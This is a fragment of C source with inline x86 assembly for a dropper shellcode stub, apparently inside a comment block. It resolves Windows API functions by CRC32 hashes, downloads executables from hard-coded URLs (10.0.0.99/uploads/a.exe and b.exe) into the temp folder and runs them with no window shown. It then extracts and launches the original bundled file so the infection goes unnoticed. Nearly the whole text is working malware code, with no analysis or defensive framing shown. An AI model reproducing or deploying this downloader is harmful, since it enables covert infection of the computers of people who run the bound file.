				mov		esi, [esi + SC1_CREATEFILE]
				mov		eax, SC1_KERNEL32
				call	sc1_resolve_function
				mov		SC1_FCREATEFILE, eax

				// Resolve WriteFileA
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_WRITEFILE]
				mov		eax, SC1_KERNEL32
				call	sc1_resolve_function
				mov		SC1_FWRITEFILE, eax

				// Resolve DeleteFileA
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_DELETEFILE]
				mov		eax, SC1_KERNEL32
				call	sc1_resolve_function
				mov		SC1_FDELETEFILE, eax

				// Resolve CloseHandle
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_CLOSEHANDLE]
				mov		eax, SC1_KERNEL32
				call	sc1_resolve_function
				mov		SC1_FCLOSEHANDLE, eax

				// Load urlm on.d ll
				push	'll'
				push	'd.no'
				push	'mlru'
				push	esp
				mov		eax, SC1_FLOADLIBRARY
				call	eax
				add		esp, 12
				mov		SC1_URLMON, eax

				// Resolve URLDownloadToFileA
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_DOWNLOAD]
				call	sc1_resolve_function
				mov		SC1_FDOWNLOAD, eax

				// Load SHELL32.DLL			'SHEL L32. DLL'
				push	'LLD'
				push	'.23L'
				push	'LEHS'
				push	esp
				mov		eax, SC1_FLOADLIBRARY
				call	eax
				mov		SC1_SHELL32, eax
				add		esp, 12

				// Resolve ShellExecuteExA
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_SHELLEXECUTE]
				call	sc1_resolve_function
				mov		SC1_FSHELLEXECUTE, eax

				jmp		sc1_unpack

				// Reserve space for our tmp variable
				mov		ecx, MAX_PATH
				sub		esp, ecx
				mov		edi, esp
				xor		al, al
				rep		stosb
				
				mov		ebx, esp
				push	0
				push	'PMET'
				mov		edx, esp

				push	MAX_PATH
				push	ebx
				push	edx
				mov		eax, SC1_FENVIRONMENT
				call	eax

				add		esp, 8
				mov		SC1_PATH, esp

				// Append file name to end of string
				mov		edi, esp
				xor		eax, eax
				mov		ecx, eax
				not		ecx
				repne	scasb
				mov		BYTE PTR [edi - 1], '\\'
				mov		DWORD PTR [edi], 'xe.a'
				mov		BYTE PTR [edi + 4], 'e'

				// Download loop
				mov		ebx, SC1_DATA
				lea		ebx, [ebx + SC1_FIRST_LINK]
sc1_downloader:

				// %Use rPro file %\a. exe\0
				push	0				// LPBINDSTATUSCALLBACK
				push	0				// Reserved
				push	SC1_PATH    	// FileName
				push	ebx				// URL
				push	0
				mov		eax, SC1_FDOWNLOAD
				call	eax

				test	al, al
				je		sc1_downloader_execute

				// Download failed - Get to next string
				mov		edi, ebx
				xor		eax, eax
				mov		ecx, eax
				not		ecx
				cld
				repne 	scasb
				mov		ebx, edi
				cmp		BYTE PTR [ebx], 0
				jne		sc1_downloader

				// We're out of strings, graceful exit
				jmp		sc1_unpack

				// Download succeeded - execute payload
sc1_downloader_execute:

				lea		eax, [ebp - 104]
				push	eax
				lea		eax, [ebp - 156]
				push	eax
				push	0
				push	0
				push	CREATE_NO_WINDOW
				push	0
				push	0
				push	0
				push	SC1_PATH
				push	0
				mov		eax, SC1_FCREATEPROCESS
				call	eax


sc1_unpack:
				// Get our module base
				mov		eax, SC1_ENTRY_POINT
				and		eax, 0ffff0000h
sc1_base_loop:
				cmp		WORD PTR [eax], 'ZM'
				je		sc1_unpack2
				sub		eax, 1000h
				jmp		sc1_base_loop

sc1_unpack2:
				mov		SC1_MODBASE, eax

				// Get pointer to original file name
				mov		edi, SC1_DATA
sc1_find_orig_file:
				xor		eax, eax
				mov		ecx, eax
				not		ecx
				cld
				repne	scasb
				dec		edi
				mov		eax, [edi]
				test	eax, eax
				je		sc1_createfile
				inc		edi
				jmp		sc1_find_orig_file

sc1_createfile:
				add		edi, 4
				mov		SC1_ORIG_FILE, edi

				// Create the original file
				int 3
				push	0
				push	FILE_ATTRIBUTE_NORMAL
				push	CREATE_NEW
				push	0
				push	0
				push	GENERIC_WRITE
				push	edi
				mov		eax, SC1_FCREATEFILE
				call	eax
				test	eax, eax
				je		sc1_exit
				mov		SC1_HANDLE, eax

				// Get .run segment (data)
				mov		ebx, SC1_MODBASE
				mov		eax, [ebx + 03ch]
				lea		ebx, [ebx + eax + 0f8h + 028h]

				// Write the original file
				push	0
				mov		eax, esp
				push	0
				push	eax
				push	[ebx + 010h]
				mov		eax, [ebx + 0ch]
				add		eax, SC1_MODBASE
				push	eax
				push	SC1_HANDLE
				mov		eax, SC1_FWRITEFILE
				call	eax
				test	eax, eax
				je		sc1_exit
				add		esp, 4

				// Close handle to the file
				push	SC1_HANDLE
				mov		eax, SC1_FCLOSEHANDLE
				call	eax

				// Start the original file
				push	0
				push	'nepo'
				mov		eax, esp
				push	SW_MAXIMIZE
				push	0
				push	0
				push	SC1_ORIG_FILE
				push	eax
				push	0
				mov		eax, SC1_FSHELLEXECUTE
				call	eax

				add		esp, 8

				// Normalize and return
sc1_exit:
				add		esp, (SC1_STACK_SIZE + MAX_PATH)
				pop		ebp
				ret


				// Expects	eax = module base
				//			esi = function hash
				// Returns  eax = address of function
sc1_resolve_function:

				// Find PE
				mov		ebx, [eax + 03ch]
				add		ebx, eax					// PE
				mov		edi, eax					// Commit to edi

				// Find EAT
				mov		ebx, [ebx + 078h]			
				add		ebx, edi					// IMAGE_EXPORT_DIRECTORY
				mov		edx, ebx

				// Find tables
				mov		ebx, [ebx + 020h]			// AddressOfNames
				add		ebx, edi

				// Find first function string
				xor		ecx, ecx
sc1_enum_functions:
				mov		eax, [ebx]
				add		eax, edi
				call	sc1_crc32
				cmp		eax, esi
				je		sc1_found_function
				add		ebx, 4
				inc		ecx
				jmp		sc1_enum_functions

sc1_found_function:
				//mov		eax, [ebx]
				//add		eax, edi

				mov		ebx, [edx + 024h]
				add		ebx, edi
				mov		cx, [ebx + 2 * ecx]
				mov		ebx, [edx + 01ch]
				add		ebx, edi
				mov		eax, [ebx + 4 * ecx]
				add		eax, edi

				ret

				// Expects	eax = string
				// Returns  eax = CRC32
sc1_crc32:
				push	ebx
				push	ecx
				xor		ebx, ebx
				dec		ebx
sc1_crc32_byte:
				xor		bl, [eax]
				mov		ecx, 8
sc1_crc32_bit:
				shr		ebx, 1
				jnc		sc1_crc32_skip
				xor		ebx, 08fdb125ch
sc1_crc32_skip:
				loop	sc1_crc32_bit

				inc		eax
				cmp		BYTE PTR [eax], 0
				jnz		sc1_crc32_byte

				mov		eax, ebx
				pop		ecx
				pop		ebx
				ret	
	}

	__asm {
sc1_sig:
				// Data sig
				_emit	0e8h
				_emit	0f2h
				_emit	08ah
				_emit	0eah
	}

	// Function Signatures
	__asm {
				// 3E07577B - LoadLibraryA
				_emit	07bh
				_emit	057h
				_emit	007h
				_emit	03eh

				// BB2D3AC0 - CreateProcessA
				_emit	0c0h
				_emit	03ah
				_emit	02dh
				_emit	0bbh

				// 395866BE - URLDownloadToFileA
				_emit	0beh
				_emit	066h
				_emit	058h
				_emit	039h

				// EDE19D36 - GetEnvironmentVariableA
				_emit	036h
				_emit	09dh
				_emit	0e1h
				_emit	0edh

				// 166CDD7B - CreateFileA
				_emit	07bh
				_emit	0ddh
				_emit	06ch
				_emit	016h

				// 15259404 - WriteFile
				_emit	004h
				_emit	094h
				_emit	025h
				_emit	015h

				// 6B548BA7 - DeleteFileA
				_emit	0a7h
				_emit	08bh
				_emit	054h
				_emit	06bh

				// D89D095A - ShellExecuteA 
				_emit	05ah
				_emit	009h
				_emit	09dh
				_emit	0d8h

				// E84033EE - CloseHandle
				_emit	0eeh
				_emit	033h
				_emit	040h
				_emit	0e8h
	}

	// Debug strings
	__asm {
				_emit	'h'
				_emit	't'
				_emit	't'
				_emit	'p'
				_emit	':'
				_emit	'/'
				_emit	'/'

				_emit	'1'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'9'
				_emit	'9'

				_emit	'/'

				_emit	'u'
				_emit	'p'
				_emit	'l'
				_emit	'o'
				_emit	'a'
				_emit	'd'
				_emit	's'

				_emit	'/'

				_emit	'b'
				_emit	'.'
				_emit	'e'
				_emit	'x'
				_emit	'e'

				_emit	0


				_emit	'h'
				_emit	't'
				_emit	't'
				_emit	'p'
				_emit	':'
				_emit	'/'
				_emit	'/'

				_emit	'1'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'9'
				_emit	'9'

				_emit	'/'

				_emit	'u'
				_emit	'p'
				_emit	'l'
				_emit	'o'
				_emit	'a'
				_emit	'd'
				_emit	's'

				_emit	'/'

				_emit	'a'
				_emit	'.'
				_emit	'e'
				_emit	'x'
				_emit	'e'

				_emit	0
				_emit	0
				_emit	0
				_emit	0
	}
}*/